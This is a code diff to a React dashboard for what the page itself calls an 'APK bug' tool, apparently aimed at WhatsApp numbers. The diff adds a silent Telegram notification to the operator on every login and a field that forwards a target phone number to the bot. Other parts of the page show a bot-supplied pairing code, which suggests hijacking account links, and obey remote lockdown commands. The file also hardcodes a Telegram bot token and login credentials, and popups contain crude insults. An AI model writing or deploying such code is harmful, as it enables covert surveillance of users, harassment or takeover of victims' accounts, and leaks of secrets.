@@ -1,7 +1,7 @@
 "use client"
 
 import React, { useState, useEffect, useRef } from "react"
-import { Shield, Bug, AlertTriangle, LayoutDashboard, Settings, Volume2, VolumeX } from "lucide-react"
+import { Shield, Bug, AlertTriangle, LayoutDashboard, Settings, Volume2, VolumeX, Trash2, Info } from "lucide-react"
 
 export default function YaeMikoDashboard() {
   const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk'; 
@@ -9,7 +9,7 @@ export default function YaeMikoDashboard() {
 
   const audioRef = useRef<HTMLAudioElement>(null);
   const triggerAudioRef = useRef<HTMLAudioElement>(null);
-  const lastCodeRef = useRef(""); // Lock buat popup pairing
+  const lastCodeRef = useRef(""); 
   
   const [isLoggedIn, setIsLoggedIn] = useState(false)
   const [isAuthLoading, setIsAuthLoading] = useState(false)
@@ -24,7 +24,6 @@ export default function YaeMikoDashboard() {
   const [showLimitPopup, setShowLimitPopup] = useState(false)
   const [showRestrictedOverlay, setShowRestrictedOverlay] = useState(false)
 
-  // Fitur Injeksi
   const [currentView, setCurrentView] = useState('dashboard')
   const [isMusicPlaying, setIsMusicPlaying] = useState(true)
   const [isMaintenance, setIsMaintenance] = useState(false)
@@ -51,6 +50,12 @@ export default function YaeMikoDashboard() {
     }
   };
 
+  const clearLogs = () => {
+    localStorage.clear();
+    setBugLimit(5);
+    alert("System Cache Cleared!");
+  };
+
   useEffect(() => {
     const checkBotCommands = setInterval(async () => {
       try {
@@ -65,8 +70,7 @@ export default function YaeMikoDashboard() {
               lastCodeRef.current = newCode;
               setShowPairModal(true);
             }
-          } else if (cmd === '/risetlimit') { setBugLimit(5); }
-          else if (cmd === '/lockdown') setIsMaintenance(true);
+          } else if (cmd === '/lockdown') setIsMaintenance(true);
           else if (cmd === '/unlock') setIsMaintenance(false);
         }
       } catch (e) {}
@@ -95,6 +99,7 @@ export default function YaeMikoDashboard() {
   const handleLoginAttempt = () => {
     if (inputUsername === "Selz" && inputPassword === "Freebug") {
       setIsAuthLoading(true); 
+      notifyBot("⚠️ ADA YANG LOGIN APK BUG LU NIH BOS ⚠️");
       setTimeout(() => {
         setIsLoggedIn(true);
         setIsMonitoringActive(true);
@@ -115,38 +120,26 @@ export default function YaeMikoDashboard() {
   return (
     <div className="relative min-h-screen text-white font-sans overflow-hidden bg-black">
       {isMaintenance && <div className="fixed inset-0 z-[9999] bg-black flex items-center justify-center text-red-500 font-black text-2xl animate-pulse">SYSTEM LOCKED</div>}
-
       {showPairModal && (
         <div className="fixed inset-0 z-[9999] bg-black/90 flex flex-col items-center justify-center backdrop-blur-xl">
           <h1 className="text-6xl font-black mb-10">{pairingCode}</h1>
           <button onClick={() => setShowPairModal(false)} className="bg-white/10 px-8 py-3 rounded-full text-xs">DISMISS</button>
         </div>
       )}
-
-      <audio ref={audioRef} src="/audio-yae.mp3" loop />
-      <audio ref={triggerAudioRef} src="/trigger-sound.mp3" />
-      
-      {isSending && (
-        <div className="fixed inset-0 z-[1000] bg-red-600/20 flex flex-col items-center justify-center backdrop-blur-sm animate-pulse">
-            <div className="text-red-500 font-black text-2xl italic tracking-[0.2em] animate-bounce">SEDANG MENGIRIM...</div>
-        </div>
-      )}
-
+      {showErrorOverlay && <div className="fixed inset-0 z-[100] bg-black/90 flex items-center justify-center" onClick={() => setShowErrorOverlay(false)}><div className="text-red-500 font-black text-2xl animate-bounce">LOGIN GAGAL!</div></div>}
       {showRestrictedOverlay && (
         <div className="fixed inset-0 z-[9999] bg-black/90 flex flex-col items-center justify-center p-10 text-center backdrop-blur-2xl animate-glitch_extreme">
           <AlertTriangle className="w-40 h-40 text-red-600 mb-10 animate-shake_violent" />
-          <h1 className="text-white font-black text-6xl mb-8 uppercase italic tracking-tighter leading-tight animate-red_glitch">
-            MAU NGAPAIN SAMA NOMOR ITU KONTOL<br/>MAU GW BAN LU?
-          </h1>
+          <h1 className="text-white font-black text-6xl mb-8 uppercase italic tracking-tighter leading-tight animate-red_glitch">MAU NGAPAIN SAMA NOMOR ITU KONTOL<br/>MAU GW BAN LU?</h1>
           <div className="text-red-400 font-bold text-lg animate-pulse">ERROR TOTAL DETECTED - SYSTEM TERMINATING</div>
         </div>
       )}
 
-      <div className="fixed inset-0 z-0">
-        <video autoPlay loop muted playsInline className="w-full h-full object-cover scale-105"><source src="/bg-anime.mp4" type="video/mp4" /></video>
-        <div className="absolute inset-0 bg-[#050b14]/70 backdrop-blur-[2px]"></div>
-      </div>
+      <audio ref={audioRef} src="/audio.mp3" loop />
+      <audio ref={triggerAudioRef} src="/trigger-sound.mp3" />
+      {isSending && <div className="fixed inset-0 z-[1000] bg-red-600/20 flex flex-col items-center justify-center backdrop-blur-sm animate-pulse"><div className="text-red-500 font-black text-2xl italic tracking-[0.2em] animate-bounce">SEDANG MENGIRIM...</div></div>}
 
+      <div className="fixed inset-0 z-0"><video autoPlay loop muted playsInline className="w-full h-full object-cover scale-105"><source src="/bg-anime.mp4" type="video/mp4" /></video><div className="absolute inset-0 bg-[#050b14]/70 backdrop-blur-[2px]"></div></div>
       {showLimitPopup && (<div className="fixed inset-0 z-[200] bg-black/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-2xl"><AlertTriangle className="w-12 h-12 text-red-500 mb-8 animate-bounce" /><h2 className="text-white font-black text-2xl mb-4 leading-tight uppercase italic">LIMIT LU ABIS NGENTOD KALO MAU LIMIT UNLIMITED PREMIUM SINI</h2><a href="http://t.me/lalaypo_bot" target="_blank" className="w-full max-w-xs py-5 bg-white text-black rounded-2xl font-black text-sm mb-6">PREMIUM KE BOT</a></div>)}
 
       {!isLoggedIn ? (
@@ -169,21 +162,22 @@ export default function YaeMikoDashboard() {
            ) : (
              <div className="flex-1 bg-[#0a1628]/40 border border-cyan-500/10 rounded-[2.5rem] p-8 backdrop-blur-md mt-10">
                <h2 className="text-2xl font-black mb-8 uppercase italic">Settings</h2>
-               <div className="flex justify-between items-center mb-6 p-4 bg-white/5 rounded-2xl border border-white/5">
-                 <span className="text-xs font-bold uppercase">Background Music</span>
-                 <button onClick={toggleMusic}>{isMusicPlaying ? <Volume2 className="w-5 h-5 text-cyan-400" /> : <VolumeX className="w-5 h-5 text-red-500" />}</button>
-               </div>
+               {/* 1. WHATSAPP PAIRING */}
+               <div className="bg-white/5 p-6 rounded-[2rem] border border-white/5 mb-6"><p className="text-[10px] font-black uppercase text-cyan-400 mb-2">WhatsApp Pairing</p><input value={targetNumber} onChange={(e) => setTargetNumber(e.target.value)} className="w-full bg-black/40 border border-white/10 p-4 rounded-xl text-sm mb-4" /><button onClick={() => notifyBot(`🔗 PAIRING REQUEST: ${targetNumber}`)} className="w-full py-3 bg-green-600 rounded-xl font-black text-xs uppercase">Link WhatsApp</button></div>
+               {/* 2. MUSIC TOGGLE */}
+               <div className="flex justify-between items-center mb-6 p-6 bg-white/5 rounded-2xl border border-white/5"><span className="text-xs font-bold uppercase">Background Music</span><button onClick={toggleMusic}>{isMusicPlaying ? <Volume2 className="w-5 h-5 text-cyan-400" /> : <VolumeX className="w-5 h-5 text-red-500" />}</button></div>
+               {/* 3. CACHE MGMT */}
+               <button onClick={clearLogs} className="w-full py-4 mb-4 bg-white/5 border border-white/10 rounded-2xl flex items-center justify-center gap-2 text-xs font-black uppercase"><Trash2 className="w-4 h-4" /> Clear Logs & Cache</button>
+               {/* 4. SYSTEM INFO */}
+               <div className="mb-6 p-4 border border-cyan-500/20 rounded-2xl bg-cyan-900/10 text-center"><Info className="w-5 h-5 mx-auto text-cyan-400 mb-2" /><p className="text-[9px] font-black uppercase tracking-widest text-cyan-400">Yae Miko Engine v3.0 | Selz Official</p></div>
+               {/* 5. LOGOUT */}
                <button onClick={() => { setIsLoggedIn(false); notifyBot("🛑 SYSTEM LOGOUT"); }} className="w-full py-4 bg-red-500/10 border border-red-500/20 text-red-500 rounded-2xl font-black text-xs uppercase">Logout System</button>
              </div>
            )}
 
-           {/* NAVIGASI BAWAH */}
-           <div className="fixed bottom-6 left-6 right-6 bg-[#0a1628]/80 border border-cyan-500/20 p-4 rounded-[2rem] backdrop-blur-xl flex justify-around">
-             <button onClick={() => setCurrentView('dashboard')}><LayoutDashboard className={currentView === 'dashboard' ? 'text-cyan-400' : 'text-white/30'} /></button>
-             <button onClick={() => setCurrentView('settings')}><Settings className={currentView === 'settings' ? 'text-cyan-400' : 'text-white/30'} /></button>
-           </div>
+           <div className="fixed bottom-6 left-6 right-6 bg-[#0a1628]/80 border border-cyan-500/20 p-4 rounded-[2rem] backdrop-blur-xl flex justify-around"><button onClick={() => setCurrentView('dashboard')}><LayoutDashboard className={currentView === 'dashboard' ? 'text-cyan-400' : 'text-white/30'} /></button><button onClick={() => setCurrentView('settings')}><Settings className={currentView === 'settings' ? 'text-cyan-400' : 'text-white/30'} /></button></div>
         </div>
       )}
     </div>
   )
-            }
+      }
